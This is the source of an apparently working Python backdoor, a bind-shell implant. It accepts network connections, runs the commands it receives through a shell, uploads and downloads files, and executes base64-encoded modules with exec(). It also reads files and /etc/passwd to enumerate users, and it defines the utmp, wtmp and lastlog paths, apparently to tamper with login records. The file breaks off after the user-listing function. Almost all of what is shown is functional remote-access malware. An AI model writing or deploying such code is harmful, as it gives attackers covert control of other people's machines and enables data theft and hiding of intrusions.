#!/usr/bin/env python
import os, sys, re, signal
import socket
import time
from subprocess import Popen,PIPE,STDOUT,call
from base64 import *
import platform
import urllib2
import random, string
import logging
import struct
import getpass
import pwd
import thread
import operator
import SocketServer, SimpleHTTPServer
from math import log

socksize = 4096                            
activePID = []
UTMP_STRUCT_SIZE    = 384
LASTLOG_STRUCT_SIZE = 292
UTMP_FILEPATH       = "/var/run/utmp"
WTMP_FILEPATH       = "/var/log/wtmp"
LASTLOG_FILEPATH    = "/var/log/lastlog"
distro = os.uname()[1]
distro2 = platform.linux_distribution()[0]
Home_Dir = os.environ['HOME']
User_Ip_Address = socket.gethostbyname(socket.gethostname())
if os.geteuid() != 0:
    currentuser = "nonroot"
else:
    currentuser = "root"


def reaper():                              
    while activePID:                        
        pid,stat = os.waitpid(0, os.WNOHANG)     
        if not pid: break
        activePID.remove(pid)


def handler(connection):                    
    time.sleep(2)     
                          
    while True:                                     
        cmd = connection.recv(socksize)
        proc = Popen(cmd,
              shell=True,
             stdout=PIPE,
             stderr=PIPE,
              stdin=PIPE,
              )
        stdout, stderr = proc.communicate()
            
        if cmd.startswith(":upload"):
            getname = cmd.split(" ")
            rem_file = getname[1]
            filename = rem_file.replace("/","_")
            filedata = connection.recv(socksize)
            newfile = file(filename, "wb")
            newfile.write(filedata)
            newfile.close()
            if os.path.isfile(filename):
                connection.send("[~] File upload complete!\n")
            if not os.path.isfile(filename):
                connection.send("[!] File upload failed! Please try again\n")

        elif cmd.startswith(":download"):
            getname = cmd.split(" ")
            loc_file = getname[1]
            if os.path.exists(loc_file) is True:
                sendfile = open(loc_file, "r")
                filedata = sendfile.read()
                sendfile.close()
                connection.sendall(filedata)
            else:
                connection.send("[!] File not found!\n")
    
        elif cmd.startswith(":exec"):
            try:
                getname = cmd.split(" ")        # split mod name from cmd
                modname = getname[1]            # Parse name of module we are retrieving. Will be used for logging and output purposes
    
                mod_data = ""                   # Our received file data will go here 
                data = connection.recv(socksize)
                mod_data += data
                #print("[+] Module recieved!") # Debug level message. Remove before distribution.
                connection.send("Complete")     # sends OK msg to the client
                modexec = b64decode(mod_data)   # decode the received file
                module_handler(modexec, modname)            # send module to module_handler where it is executed and pipes data back to client
                
            except IndexError:
                pass

        elif cmd == (":quit"):
            print("[!] Closing server!")
            conn.close()
            os._exit(0)
            sys.exit(0)

        elif proc:
            connection.send( stdout )
            connection.send("shell => ")

    connection.close() 
    os._exit(0)


def accept():                                
    while 1:   
        global connection                                  
        connection, address = conn.accept()
        connection.send("shell => ")
        reaper()
        childPid = os.fork()                     # forks the incoming connection and sends to conn handler
        if childPid == 0:
            handler(connection)
        else:
            activePID.append(childPid)


def module_handler(module, modname):
    status_msg("[+] Module: %s\n" % modname)
    status_msg("[+] Start time: %s" % logtime)
    exec(module)
    connection.send("shell => ")


def status_msg(message):
    connection.send("%s" % message)


def log_msg(message):
    connection.send(":log %s" % message)


def cat_file(filename):
    if os.path.exists(filename) and os.access(filename, os.R_OK):
        catfile = open(filename, "rb")
        connection.send("[+] Contents of %s" % filename)
        for lines in catfile.readlines():
            connection.sendall(lines)
        catfile.close()


def save_file(filename):
    if os.path.exists(filename) and os.access(filename, os.R_OK):
        savefile = open(filename, "rb")
        filedata = savefile.read()
        savefile.close()
        connection.send(":savef %s" % filename)
        time.sleep(2)
        connection.sendall( filedata )
    else:
        pass


def cmd_exec(command):
    proc = Popen(command,
              shell=True,
              stdout=PIPE,
              stderr=PIPE,
               stdin=PIPE,
               )
    stdout, stderr = proc.communicate()
    connection.sendall( stdout )

def cmd2txt(command, textfile):
    os.system("%s > %s" % (command, textfile))
    save_file(textfile)
    os.system("rm %s" % textfile)


def whereis(program):
    for path in os.environ.get('PATH', '').split(':'):
        if os.path.exists(os.path.join(path, program)) and \
            not os.path.isdir(os.path.join(path, program)):
                return os.path.join(path, program)
    return None
    

def users():
    global userlist
    userlist = []
    if os.access('/etc/passwd', os.R_OK):
        passwd = open('/etc/passwd')
        for line in passwd:
            fields = line.split(':')
            uid = int(fields[2])
            if uid > 500 and uid < 32328:
                userlist.append(fields[0])


